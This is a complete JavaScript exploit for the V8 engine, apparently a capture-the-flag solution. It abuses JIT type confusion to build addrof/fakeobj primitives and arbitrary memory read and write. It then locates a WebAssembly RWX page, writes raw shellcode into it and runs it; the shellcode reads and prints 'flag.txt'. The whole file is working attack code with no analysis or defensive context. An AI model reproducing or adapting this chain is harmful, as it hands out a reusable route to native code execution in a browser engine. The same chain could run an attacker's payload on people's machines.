/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function ftoi_hex(val) {
    return "0x" + ftoi(val).toString(16);
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var pwn = wasm_instance.exports.main;


function as_float(arr, idx, value) { // treats arr like a float array
    // do some shi so we dont inline
    // console.log(idx + 1);
    let a = idx * 1337 + "b";
    for (let i = 0; i < 500; i++) {
        a += i;
    }
    if (value)
        arr[idx] = value;
    return arr[idx];
}

function as_obj(arr, idx, value) { // treats arr like an object array
    let b = idx * 7331 + "a";
    for (let i = 0; i < 2; i++) {
        b += i;
    }
    if (value)
        arr[idx] = value;
    return arr[idx];
}

let dummy_obj = {a: 1};
let float_arr = [1.1, 2.2, 3.3, 4.4];
let obj_arr = [dummy_obj];

let bruh = 0;
// optimize these function by turning them hot
for (let i = 0; i < 0x1000; i++) {
    bruh += as_float(float_arr, 0, 6.9);
    as_obj(obj_arr, 0, {b: 2});
}


function addrof(obj) {
    obj_arr[0] = obj;
    return ftoi(as_float(obj_arr, 0));
}

function fakeobj(addr) {
    if (addr % 2n == 0n) {
        addr += 1n;
    }
    as_float(obj_arr, 0, itof(addr));
    return obj_arr[0];
}

let float_arr_map = 0x0804222d082439f1n;
// let arb_rw_arr = [itof(float_arr_map_offset), 2.2];
let arb_rw_arr = [1.1, 2.2, 3.3, 4.4];
arb_rw_arr[0] = itof(float_arr_map);
// %DebugPrint(arb_rw_arr);

function arbread(addr) {
    if (addr % 2n == 0n) {
        addr += 1n;
    }
    addr = addr & 0xffffffffn;
    console.log("[*] Address: 0x" + addr.toString(16));
    let fake = fakeobj(addrof(arb_rw_arr) + 0x20n);
    // %DebugPrint(fake);
    arb_rw_arr[1] = itof((2n << 32n) + addr - 0x8n);
    
    return ftoi(fake[0]);
}

function arbwrite_util(addr, value) {
    if (addr % 2n == 0n) {
        addr += 1n;
    }
    let fake = fakeobj(addrof(arb_rw_arr) + 0x20n);
    arb_rw_arr[1] = itof((2n << 32n) + addr - 0x8n);
    // %DebugPrint(fake);
    fake[0] = itof(value);
}

let test_arr = [4.1, 4.2, 4.3, 4.4];
console.log("[*] Testing addrof: 0x" + addrof(test_arr).toString(16));

// poc that overwrites object pointers of obj_arr
// %DebugPrint(obj_arr);
// as_float(obj_arr, 0, itof(0x1337n));

// console.log("[*] Address of dummy_obj: 0x" + addrof(dummy_obj).toString(16));
console.log("[*] Testing arbread: ", itof(arbread(addrof(test_arr) + 0x20n)));
console.log("[*] Testing arbwrite BEFORE: ", arbread(addrof(test_arr) + 0x20n).toString(16));
arbwrite_util(addrof(test_arr) + 0x20n, 0x1337n);
console.log("[*] Testing arbwrite AFTER: ", arbread(addrof(test_arr) + 0x20n).toString(16));

let rwx_page = arbread(addrof(wasm_instance) + 0x68n);

console.log("[*] RWX page: 0x" + rwx_page.toString(16));

let arr_buf = new ArrayBuffer(0x100);
// overwrite backing store pointer of arr_buf
arbwrite_util(addrof(arr_buf) + 0x14n, rwx_page);
let dataview = new DataView(arr_buf);

// write shellcode
let shellcode = [144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,144,106,1,254,12,36,72,184,102,108,97,103,46,116,120,116,80,106,2,88,72,137,231,49,246,15,5,65,186,255,255,255,127,72,137,198,106,40,88,106,1,95,153,15,5,];

for (let i = 0; i < shellcode.length; i++) {
    dataview.setUint8(i, shellcode[i], true);
}

pwn();